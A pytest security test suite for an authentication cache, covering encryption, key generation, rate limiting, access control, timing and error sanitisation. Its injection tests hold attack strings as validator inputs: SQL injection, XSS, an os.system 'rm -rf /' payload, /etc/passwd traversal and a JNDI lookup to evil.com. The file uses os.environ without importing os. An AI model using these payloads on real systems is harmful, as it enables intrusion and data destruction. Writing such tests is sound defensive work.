"""
Authentication Cache Security Test Suite
========================================

Comprehensive security testing for the authentication caching system.
Tests for vulnerabilities, attack scenarios, and security compliance.

Test Categories:
- Encryption and Key Management
- Cache Injection Attacks
- Timing Attack Resistance
- Access Control Validation
- Rate Limiting Effectiveness
- Input Validation Security
- Thread Safety under Attack
- Error Handling Security
- OWASP Compliance Validation

This test suite is designed to validate the security fixes identified
in the security audit and ensure the system is resilient against attacks.
"""

import pytest
import asyncio
import time
import threading
import secrets
import hashlib
import json
import base64
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta
from typing import Dict, Any, List

# Import security modules (assuming they're implemented)
try:
    from ..docs.secure_cache_configuration import (
        SecureCacheEncryption,
        SecureCacheKeyGenerator,
        SecureInputValidator,
        SecureAccessController,
        SecureCache,
        RateLimitConfig,
        AccessControlConfig,
        create_secure_token_fingerprint,
        sanitize_error_message
    )
except ImportError:
    pytest.skip("Secure cache configuration not available", allow_module_level=True)

# Import existing cache implementations
from app.utils.auth_cache import (
    TTLCache,
    RequestCache,
    JWKSCache,
    verify_clerk_token_cached
)


class TestCacheEncryptionSecurity:
    """Test encryption security implementation"""
    
    def test_encryption_key_generation(self):
        """Test secure encryption key generation"""
        encryption = SecureCacheEncryption()
        
        # Verify key is generated if not provided
        assert encryption._master_key is not None
        assert len(encryption._master_key) >= 32  # At least 256 bits
        
    def test_encryption_decryption_roundtrip(self):
        """Test encryption/decryption integrity"""
        encryption = SecureCacheEncryption()
        
        test_data = {
            "user_id": "test_user_123",
            "email": "test@example.com",
            "roles": ["user", "admin"],
            "timestamp": datetime.now().isoformat()
        }
        
        # Encrypt data
        encrypted = encryption.encrypt_cache_value(test_data, "test_context")
        
        # Verify encrypted data is not readable
        assert "test_user_123" not in encrypted
        assert "test@example.com" not in encrypted
        
        # Decrypt data
        decrypted = encryption.decrypt_cache_value(encrypted)
        
        # Verify data integrity
        assert decrypted == test_data
    
    def test_encryption_context_isolation(self):
        """Test that different contexts produce different ciphertexts"""
        encryption = SecureCacheEncryption()
        test_data = {"sensitive": "data"}
        
        encrypted_ctx1 = encryption.encrypt_cache_value(test_data, "context1")
        encrypted_ctx2 = encryption.encrypt_cache_value(test_data, "context2")
        
        # Different contexts should produce different ciphertexts
        assert encrypted_ctx1 != encrypted_ctx2
        
        # Both should decrypt correctly
        assert encryption.decrypt_cache_value(encrypted_ctx1) == test_data
        assert encryption.decrypt_cache_value(encrypted_ctx2) == test_data
    
    def test_tampered_data_detection(self):
        """Test detection of tampered encrypted data"""
        encryption = SecureCacheEncryption()
        test_data = {"user": "test"}
        
        encrypted = encryption.encrypt_cache_value(test_data)
        
        # Tamper with encrypted data
        tampered = encrypted[:-10] + "X" * 10
        
        # Should raise exception on tampered data
        with pytest.raises(ValueError, match="Decryption failed"):
            encryption.decrypt_cache_value(tampered)


class TestSecureCacheKeyGeneration:
    """Test secure cache key generation"""
    
    def test_key_uniqueness(self):
        """Test that keys are unique across calls"""
        generator = SecureCacheKeyGenerator()
        
        keys = set()
        for i in range(1000):
            key = generator.generate_secure_key(f"data_{i}")
            assert key not in keys, f"Duplicate key generated: {key}"
            keys.add(key)
    
    def test_key_entropy(self):
        """Test cache key entropy and unpredictability"""
        generator = SecureCacheKeyGenerator()
        
        # Generate many keys with same input
        keys = [generator.generate_secure_key("same_input") for _ in range(100)]
        
        # All keys should be different (due to salt/timestamp)
        assert len(set(keys)) == 100
        
        # Keys should have good entropy (rough check)
        key_bytes = [key.encode() for key in keys]
        entropy_scores = []
        
        for key_data in key_bytes:
            # Simple entropy check - count unique bytes
            unique_bytes = len(set(key_data))
            entropy_scores.append(unique_bytes)
        
        avg_entropy = sum(entropy_scores) / len(entropy_scores)
        assert avg_entropy > 30, f"Low key entropy: {avg_entropy}"
    
    def test_token_fingerprint_security(self):
        """Test secure token fingerprinting"""
        generator = SecureCacheKeyGenerator()
        
        # Create realistic JWT token (mock)
        jwt_header = base64.b64encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode()).decode()
        jwt_payload = base64.b64encode(json.dumps({"sub": "user123", "exp": time.time() + 3600}).encode()).decode()
        jwt_signature = "mock_signature"
        jwt_token = f"{jwt_header}.{jwt_payload}.{jwt_signature}"
        
        fingerprint = generator.generate_token_fingerprint(jwt_token, "user123")
        
        # Fingerprint should not contain original token
        assert jwt_token not in fingerprint
        assert "user123" not in fingerprint
        assert len(fingerprint) == 64  # SHA-256 hex
        
        # Same token should produce different fingerprints (due to salt)
        fingerprint2 = generator.generate_token_fingerprint(jwt_token, "user123")
        assert fingerprint != fingerprint2


class TestInputValidationSecurity:
    """Test input validation and sanitization"""
    
    def test_cache_key_injection_prevention(self):
        """Test prevention of cache key injection attacks"""
        validator = SecureInputValidator()
        
        # Test various injection attempts
        injection_attempts = [
            "key'; DELETE FROM cache; --",
            "key<script>alert('xss')</script>",
            "key${env.SECRET}",
            "key__import__('os').system('rm -rf /')",
            "key/../../../etc/passwd",
            "key\x00null_byte",
            "key'\";\n\r\t",
            "a" * 500,  # Oversized key
        ]
        
        for malicious_key in injection_attempts:
            with pytest.raises(ValueError):
                validator.validate_cache_key(malicious_key)
    
    def test_ttl_validation_security(self):
        """Test TTL validation against attacks"""
        validator = SecureInputValidator()
        
        # Test invalid TTL values
        invalid_ttls = [
            -1,          # Negative TTL
            0,           # Zero TTL
            999999999,   # Excessive TTL
            "not_int",   # Non-integer
            None,        # None value
        ]
        
        for invalid_ttl in invalid_ttls:
            with pytest.raises((ValueError, TypeError)):
                validator.validate_ttl(invalid_ttl)
    
    def test_cache_value_size_limits(self):
        """Test cache value size limit enforcement"""
        validator = SecureInputValidator()
        
        # Test oversized values
        large_value = {"data": "X" * (1024 * 1024 + 1)}  # Over 1MB
        
        with pytest.raises(ValueError, match="too large"):
            validator.validate_cache_value_size(large_value)
        
        # Test acceptable size
        small_value = {"data": "small"}
        assert validator.validate_cache_value_size(small_value) is True


class TestRateLimitingSecurity:
    """Test rate limiting security"""
    
    def test_rate_limit_enforcement(self):
        """Test rate limiting prevents abuse"""
        controller = SecureAccessController()
        config = RateLimitConfig(requests_per_minute=10, burst_limit=5)
        
        client_id = "test_client"
        
        # Should allow requests up to limit
        for i in range(10):
            assert controller.check_rate_limit(client_id, config) is True
        
        # Should deny additional requests
        for i in range(5):
            assert controller.check_rate_limit(client_id, config) is False
    
    def test_rate_limit_window_sliding(self):
        """Test sliding window rate limiting"""
        controller = SecureAccessController()
        config = RateLimitConfig(requests_per_minute=5, window_size=10)  # 5 requests per 10 seconds
        
        client_id = "test_client"
        
        # Use up rate limit
        for i in range(5):
            assert controller.check_rate_limit(client_id, config) is True
        
        # Should be blocked
        assert controller.check_rate_limit(client_id, config) is False
        
        # Wait for window to slide
        time.sleep(11)
        
        # Should be allowed again
        assert controller.check_rate_limit(client_id, config) is True
    
    def test_per_client_rate_limiting(self):
        """Test that rate limiting is per-client"""
        controller = SecureAccessController()
        config = RateLimitConfig(requests_per_minute=3)
        
        # Use up limit for client1
        for i in range(3):
            assert controller.check_rate_limit("client1", config) is True
        assert controller.check_rate_limit("client1", config) is False
        
        # Client2 should still have full limit
        for i in range(3):
            assert controller.check_rate_limit("client2", config) is True


class TestAccessControlSecurity:
    """Test access control security"""
    
    def test_authentication_requirement(self):
        """Test authentication requirement enforcement"""
        controller = SecureAccessController()
        config = AccessControlConfig(require_authentication=True)
        
        # Unauthenticated user should be denied
        user_data = {"authenticated": False}
        assert controller.check_access_permission(user_data, config) is False
        
        # Authenticated user should be allowed
        user_data = {"authenticated": True}
        assert controller.check_access_permission(user_data, config) is True
    
    def test_role_based_access_control(self):
        """Test role-based access control"""
        controller = SecureAccessController()
        config = AccessControlConfig(
            require_authentication=True,
            allowed_roles=["admin", "cache_user"]
        )
        
        # User without required role should be denied
        user_data = {"authenticated": True, "roles": ["regular_user"]}
        assert controller.check_access_permission(user_data, config) is False
        
        # User with required role should be allowed
        user_data = {"authenticated": True, "roles": ["admin", "other"]}
        assert controller.check_access_permission(user_data, config) is True
    
    def test_permission_based_access_control(self):
        """Test permission-based access control"""
        controller = SecureAccessController()
        config = AccessControlConfig(
            require_authentication=True,
            require_permission="cache.read"
        )
        
        # User without required permission should be denied
        user_data = {"authenticated": True, "permissions": ["other.permission"]}
        assert controller.check_access_permission(user_data, config) is False
        
        # User with required permission should be allowed
        user_data = {"authenticated": True, "permissions": ["cache.read", "other.permission"]}
        assert controller.check_access_permission(user_data, config) is True


class TestTimingAttackResistance:
    """Test resistance to timing attacks"""
    
    def test_constant_time_cache_operations(self):
        """Test that cache operations have consistent timing"""
        # Create secure cache
        base_cache = TTLCache()
        secure_cache = SecureCache(base_cache, enable_encryption=True)
        
        # Measure timing for cache hits vs misses
        hit_times = []
        miss_times = []
        
        # Set up some cache entries
        for i in range(10):
            secure_cache.set(f"key_{i}", f"value_{i}")
        
        # Measure cache hit times
        for i in range(100):
            start_time = time.perf_counter()
            secure_cache.get("key_5")  # This exists
            end_time = time.perf_counter()
            hit_times.append(end_time - start_time)
        
        # Measure cache miss times
        for i in range(100):
            start_time = time.perf_counter()
            secure_cache.get("nonexistent_key")  # This doesn't exist
            end_time = time.perf_counter()
            miss_times.append(end_time - start_time)
        
        # Calculate average times
        avg_hit_time = sum(hit_times) / len(hit_times)
        avg_miss_time = sum(miss_times) / len(miss_times)
        
        # Timing difference should be minimal (within 50% variation)
        time_ratio = max(avg_hit_time, avg_miss_time) / min(avg_hit_time, avg_miss_time)
        assert time_ratio < 2.0, f"Timing attack possible: hit={avg_hit_time:.6f}s, miss={avg_miss_time:.6f}s"


class TestConcurrencyAttacks:
    """Test security under concurrent access"""
    
    def test_race_condition_resistance(self):
        """Test resistance to race condition attacks"""
        base_cache = TTLCache()
        secure_cache = SecureCache(base_cache)
        
        results = []
        errors = []
        
        def concurrent_operations(thread_id):
            try:
                # Each thread performs many operations
                for i in range(50):
                    key = f"thread_{thread_id}_key_{i}"
                    value = f"thread_{thread_id}_value_{i}"
                    
                    # Set, get, delete sequence
                    secure_cache.set(key, value)
                    retrieved = secure_cache.get(key)
                    secure_cache.delete(key)
                    
                    # Verify data integrity
                    if retrieved != value:
                        results.append(False)
                    else:
                        results.append(True)
            except Exception as e:
                errors.append(e)
        
        # Start multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=concurrent_operations, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # All operations should have succeeded
        assert not errors, f"Errors during concurrent access: {errors}"
        assert all(results), f"Data integrity failures: {len([r for r in results if not r])}"
    
    def test_thread_safe_key_generation(self):
        """Test thread-safe cache key generation"""
        generator = SecureCacheKeyGenerator()
        generated_keys = []
        errors = []
        
        def generate_keys(thread_id):
            try:
                thread_keys = []
                for i in range(100):
                    key = generator.generate_secure_key(f"data_{thread_id}_{i}")
                    thread_keys.append(key)
                generated_keys.extend(thread_keys)
            except Exception as e:
                errors.append(e)
        
        # Start multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=generate_keys, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Should have no errors
        assert not errors, f"Key generation errors: {errors}"
        
        # All keys should be unique
        assert len(generated_keys) == len(set(generated_keys)), "Duplicate keys generated under concurrency"


class TestErrorHandlingSecurity:
    """Test secure error handling"""
    
    def test_error_message_sanitization(self):
        """Test that error messages don't leak sensitive information"""
        # Test various error types
        test_errors = [
            ValueError("Invalid JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."),
            PermissionError("Access denied for user admin@company.com"),
            ConnectionError("Failed to connect to redis://password:secret@localhost:6379"),
            TimeoutError("Timeout waiting for database at postgresql://user:pass@db.internal:5432/prod")
        ]
        
        for error in test_errors:
            # Production error message (should be sanitized)
            with patch.dict(os.environ, {"ENVIRONMENT": "production"}):
                sanitized = sanitize_error_message(error)
                
                # Should not contain sensitive information
                assert "eyJ" not in sanitized  # JWT token
                assert "@company.com" not in sanitized  # Email
                assert "password" not in sanitized  # Redis password
                assert ":pass@" not in sanitized  # DB password
                assert "db.internal" not in sanitized  # Internal hostname
    
    def test_development_vs_production_errors(self):
        """Test different error handling for dev vs production"""
        error = ValueError("Detailed technical error message")
        
        # Development should include details
        with patch.dict(os.environ, {"ENVIRONMENT": "development"}):
            dev_message = sanitize_error_message(error, include_details=True)
            assert "Detailed technical error message" in dev_message
        
        # Production should not include details
        with patch.dict(os.environ, {"ENVIRONMENT": "production"}):
            prod_message = sanitize_error_message(error, include_details=False)
            assert "Detailed technical error message" not in prod_message
            assert prod_message == "Invalid input data"


class TestJWTTokenSecurity:
    """Test JWT token security in caching"""
    
    def test_no_plaintext_token_storage(self):
        """Test that JWT tokens are not stored in plaintext"""
        # Create mock token
        jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature"
        user_id = "user123"
        
        # Generate secure fingerprint
        fingerprint = create_secure_token_fingerprint(jwt_token, user_id)
        
        # Fingerprint should not contain original token
        assert jwt_token not in fingerprint
        assert "eyJ0eXAiOiJKV1QiL" not in fingerprint  # Base64 prefix
        assert user_id not in fingerprint
        
        # Should be a proper hash
        assert len(fingerprint) == 64  # SHA-256 hex length
        assert all(c in "0123456789abcdef" for c in fingerprint)
    
    def test_token_fingerprint_collision_resistance(self):
        """Test token fingerprint collision resistance"""
        base_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature"
        user_id = "user123"
        
        # Generate many fingerprints with slight variations
        fingerprints = set()
        
        for i in range(1000):
            # Slightly modify token (simulating different timestamps, etc.)
            modified_token = base_token + str(i)
            fingerprint = create_secure_token_fingerprint(modified_token, user_id)
            
            assert fingerprint not in fingerprints, f"Collision detected: {fingerprint}"
            fingerprints.add(fingerprint)
        
        assert len(fingerprints) == 1000


class TestCacheInjectionSecurity:
    """Test prevention of cache injection attacks"""
    
    def test_cache_poisoning_prevention(self):
        """Test prevention of cache poisoning attacks"""
        base_cache = TTLCache()
        secure_cache = SecureCache(base_cache)
        
        # Attempt to inject malicious data
        malicious_attempts = [
            ("normal_key", {"__admin": True, "roles": ["admin"]}),
            ("key", {"user_id": "../../admin"}),
            ("key", {"data": "${env.SECRET_KEY}"}),
            ("key", {"eval": "__import__('os').system('rm -rf /')"}),
        ]
        
        for key, malicious_data in malicious_attempts:
            try:
                # This should succeed (storing is allowed)
                secure_cache.set(key, malicious_data)
                
                # But retrieval should be safe
                retrieved = secure_cache.get(key)
                
                # Data should be properly serialized/deserialized, not executed
                assert isinstance(retrieved, dict)
                assert retrieved == malicious_data  # Should be stored as-is, not executed
                
            except Exception as e:
                # If validation catches it, that's also acceptable
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()
    
    def test_namespace_isolation(self):
        """Test cache namespace isolation"""
        base_cache = TTLCache()
        secure_cache = SecureCache(base_cache)
        
        # Store data in different namespaces (simulated by different contexts)
        admin_context = {"user": {"roles": ["admin"]}}
        user_context = {"user": {"roles": ["user"]}}
        
        # This test would require modifying SecureCache to support namespaces
        # For now, we test that keys are properly isolated
        key1 = "shared_key"
        key2 = "shared_key"  # Same key name
        
        secure_cache.set(key1, "admin_data", context=admin_context)
        secure_cache.set(key2, "user_data", context=user_context)
        
        # Since keys are made unique by the secure key generator,
        # they shouldn't interfere with each other
        admin_data = secure_cache.get(key1, context=admin_context)
        user_data = secure_cache.get(key2, context=user_context)
        
        # Data should be properly isolated
        assert admin_data == "admin_data"
        assert user_data == "user_data"


class TestOWSPComplianceValidation:
    """Test OWASP compliance"""
    
    def test_a01_broken_access_control(self):
        """Test access control implementation"""
        controller = SecureAccessController()
        config = AccessControlConfig(require_authentication=True)
        
        # Should deny unauthenticated access
        assert controller.check_access_permission({}, config) is False
        
        # Should allow authenticated access
        assert controller.check_access_permission({"authenticated": True}, config) is True
    
    def test_a02_cryptographic_failures(self):
        """Test cryptographic implementation"""
        encryption = SecureCacheEncryption()
        
        # Test encryption strength
        test_data = {"sensitive": "information"}
        encrypted = encryption.encrypt_cache_value(test_data)
        
        # Should not contain plaintext
        assert "sensitive" not in encrypted
        assert "information" not in encrypted
        
        # Should use proper encryption metadata
        metadata = json.loads(base64.b64decode(encrypted).decode())
        assert metadata["algorithm"] == "AES-256-GCM"
        assert "salt" in metadata
        assert len(base64.b64decode(metadata["salt"])) >= 16  # Minimum salt size
    
    def test_a03_injection_prevention(self):
        """Test injection attack prevention"""
        validator = SecureInputValidator()
        
        # Common injection patterns should be blocked
        injection_patterns = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>", 
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "../../../etc/passwd"  # Path traversal
        ]
        
        for pattern in injection_patterns:
            with pytest.raises(ValueError):
                validator.validate_cache_key(pattern)
    
    def test_a05_security_misconfiguration(self):
        """Test secure configuration validation"""
        from ..docs.secure_cache_configuration import validate_security_configuration
        
        # Test with insecure configuration
        with patch.dict(os.environ, {
            "DEBUG": "true",
            "ENVIRONMENT": "production"
        }, clear=True):
            report = validate_security_configuration()
            assert report["status"] == "FAIL"
            
            # Should identify debug mode in production
            debug_issues = [issue for issue in report["issues"] if "debug" in issue["message"].lower()]
            assert len(debug_issues) > 0


class TestPerformanceSecurityTradeoffs:
    """Test that security measures don't create performance vulnerabilities"""
    
    def test_encryption_performance_limits(self):
        """Test encryption doesn't create DoS vulnerabilities"""
        encryption = SecureCacheEncryption()
        
        # Test with large data (but within limits)
        large_data = {"data": "X" * (100 * 1024)}  # 100KB
        
        start_time = time.time()
        encrypted = encryption.encrypt_cache_value(large_data)
        decrypted = encryption.decrypt_cache_value(encrypted)
        end_time = time.time()
        
        # Should complete within reasonable time (prevent DoS)
        operation_time = end_time - start_time
        assert operation_time < 1.0, f"Encryption too slow: {operation_time}s"
        
        # Data should be correct
        assert decrypted == large_data
    
    def test_rate_limiting_performance(self):
        """Test rate limiting doesn't create bottlenecks"""
        controller = SecureAccessController()
        config = RateLimitConfig(requests_per_minute=1000)
        
        start_time = time.time()
        
        # Perform many rate limit checks
        for i in range(1000):
            result = controller.check_rate_limit(f"client_{i % 10}", config)
            assert result is True
        
        end_time = time.time()
        
        # Should be fast enough to not create bottleneck
        operation_time = end_time - start_time
        assert operation_time < 0.5, f"Rate limiting too slow: {operation_time}s for 1000 checks"


if __name__ == "__main__":
    # Run security tests with verbose output
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "-k", "not slow"  # Skip slow tests by default
    ])